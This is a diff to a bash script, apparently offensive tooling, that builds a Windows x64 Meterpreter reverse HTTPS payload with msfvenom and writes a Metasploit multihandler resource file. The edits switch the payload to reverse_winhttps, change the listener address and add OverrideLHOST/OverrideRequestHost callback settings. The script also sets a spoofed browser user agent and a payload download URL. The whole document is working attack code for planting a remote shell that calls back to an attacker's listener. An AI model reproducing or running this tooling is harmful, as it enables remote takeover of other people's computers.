@@ -1,26 +1,29 @@
 #!/bin/bash
 # shellcode replacement stuff
 # meterpreter PSH-NET payload
-# darksh3llRU v1.0
+# darksh3llRU beta v1.0
 
 # payload options for staged msfvenom -p windows/x64/meterpreter/reverse_https --list-options
-payload="windows/x64/meterpreter/reverse_https"
-#payload="windows/x64/meterpreter/reverse_winhttps"
-ListenerIP=192.168.88.19
+# payload options for staged msfvenom -p windows/x64/meterpreter_reverse_https --list-options
+#payload="windows/x64/meterpreter_reverse_https"
+payload="windows/x64/meterpreter/reverse_winhttps"
+ListenerIP=192.168.0.111
 ListenerPort=443
 ListenerURI="/logout/"
 ProxyType=HTTP
-#HttpProxyIE=true
 ProxyHost=""
 ProxyPort=""
 ProxyUser=""
 ProxyPass=""
-UserAgent="'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'"
+declare "UserAgent"="'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'"
 DownloadURL="http://10.0.8.4:8080"
 
+
 # payload options one liner
-# reverse_https
-payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpProxyType=$ProxyType HttpProxyHost=$ProxyHost HttpProxyPort=$ProxyPort HttpProxyUser=$ProxyUser HttpProxyPass=$ProxyPass HttpUserAgent=$UserAgent"
+# reverse_https with proxy settings for stageless only
+#payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpProxyType=$ProxyType HttpProxyHost=$ProxyHost HttpProxyPort=$ProxyPort HttpProxyUser=$ProxyUser HttpProxyPass=$ProxyPass HttpUserAgent=$UserAgent"
+# reverse https without proxy settings for staged only
+payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpUserAgent=$UserAgent OverrideLHOST=$ListenerIP OverrideLPORT=$ListenerPort OverrideRequestHost=true"
 printf "Payload and options used:\n$payload\n$payload_options\n...\n"
 
 # generate payload
@@ -134,5 +137,8 @@ printf "set HttpProxyPort $ProxyPort\n" >> multihandler.rc
 printf "set HttpProxyUser $ProxyUser\n" >> multihandler.rc
 printf "set HttpProxyPass $ProxyPass\n" >> multihandler.rc
 printf "set HttpUserAgent $UserAgent\n" >> multihandler.rc
+printf "set OverrideLHOST $ListenerIP\n" >> multihandler.rc
+printf "set OverrideLPORT $ListenerPort\n" >> multihandler.rc
+printf "set OverrideRequestHost true\n" >> multihandler.rc
 printf "exploit -j -z\n" >> multihandler.rc
 printf "Run listener: msfconsole -r multihandler.rc\n"
